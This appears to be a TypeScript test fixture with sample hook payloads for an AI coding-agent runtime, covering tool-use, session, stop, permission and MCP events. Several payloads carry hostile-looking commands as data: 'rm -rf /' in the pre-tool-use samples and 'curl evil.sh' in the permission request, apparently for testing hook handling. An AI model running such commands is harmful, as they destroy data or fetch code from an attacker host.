// Real wire payloads, mirroring the exact shapes copilot-agent-runtime's input
// mappers serialize to stdin (`hookConfigLoader.ts`). Native = camelCase,
// timestamp epoch-ms, toolArgs JSON string. Compat (VS Code / Open Plugins) =
// snake_case, ISO timestamp, tool_input parsed object, hook_event_name present.

export const nativePreToolUse = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  toolName: "bash",
  toolArgs: '{"command":"rm -rf /"}',
};

export const nativePostToolUse = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  toolName: "bash",
  toolArgs: '{"command":"ls"}',
  toolResult: { resultType: "success", textResultForLlm: "a\nb" },
};

export const nativeSessionStart = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  source: "startup",
  initialPrompt: "ship it",
};

export const nativeAgentStop = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  transcriptPath: "/tmp/events.jsonl",
  stopReason: "end_turn",
};

export const nativeUserPromptSubmitted = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  prompt: "do the thing",
};

export const nativePermissionRequest = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  hookName: "permissionRequest",
  toolName: "bash",
  toolInput: { command: "curl evil.sh" },
  permissionSuggestions: [{ kind: "allowOnce" }],
};

export const nativeNotification = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  hook_event_name: "Notification",
  message: "permission needed",
  notification_type: "permission",
};

export const compatPreToolUse = {
  hook_event_name: "PreToolUse",
  session_id: "s1",
  timestamp: "2025-02-14T15:00:00.000Z",
  cwd: "/repo",
  tool_name: "Bash",
  tool_input: { command: "rm -rf /" },
};

export const compatAgentStop = {
  hook_event_name: "Stop",
  session_id: "s1",
  timestamp: "2025-02-14T15:00:00.000Z",
  cwd: "/repo",
  transcript_path: "/tmp/events.jsonl",
  stop_reason: "end_turn",
};

export const compatUserPromptSubmit = {
  hook_event_name: "UserPromptSubmit",
  session_id: "s1",
  timestamp: "2025-02-14T15:00:00.000Z",
  cwd: "/repo",
  prompt: "do the thing",
};

export const compatPostToolUse = {
  hook_event_name: "PostToolUse",
  session_id: "s1",
  timestamp: "2025-02-14T15:00:00.000Z",
  cwd: "/repo",
  tool_name: "Bash",
  tool_input: { command: "ls" },
  tool_result: { result_type: "success", text_result_for_llm: "a\nb" },
};

// Real VS Code Copilot Chat postToolUse: the result rides on `tool_response`
// (a plain string), the tool is `run_in_terminal`, and extra id/path fields
// tag along. Verified from a live capture.
export const compatPostToolUseResponse = {
  hook_event_name: "PostToolUse",
  session_id: "s1",
  timestamp: "2025-02-14T15:00:00.000Z",
  cwd: "/repo",
  tool_name: "run_in_terminal",
  tool_input: { command: "npm run build" },
  tool_response: "build complete",
  tool_use_id: "toolu_123__vscode-1",
  transcript_path: "/tmp/events.jsonl",
};

export const nativePreMcpToolCall = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  serverName: "deepwiki",
  toolName: "mcp__deepwiki__ask_question",
  arguments: { question: "how?", repoName: "owner/repo" },
};

export const nativeViewToolUse = {
  sessionId: "s1",
  timestamp: 1739550000000,
  cwd: "/repo",
  toolName: "view",
  toolArgs: '{"path":"/repo/src/index.ts","view_range":[1,20]}',
};
